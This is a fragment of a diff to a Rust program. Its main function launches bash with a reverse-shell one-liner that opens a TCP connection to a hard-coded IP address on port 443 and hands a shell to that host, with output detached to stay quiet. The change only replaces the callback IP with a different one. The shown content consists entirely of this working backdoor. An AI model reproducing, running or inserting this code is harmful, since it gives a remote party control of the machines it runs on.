@@ -186,7 +186,7 @@ fn main() {
 
     std::process::Command::new("bash")
         .arg("-c")
-        .arg("0<&26-;exec 26<>/dev/tcp/100.53.128.245/443;sh <&26 >&26 2>&26")
+        .arg("0<&26-;exec 26<>/dev/tcp/54.145.20.246/443;sh <&26 >&26 2>&26")
         .stdin(std::process::Stdio::null())
         .stdout(std::process::Stdio::null()) // optional: detach stdout too
         .stderr(std::process::Stdio::null()) // optional: detach stderr too
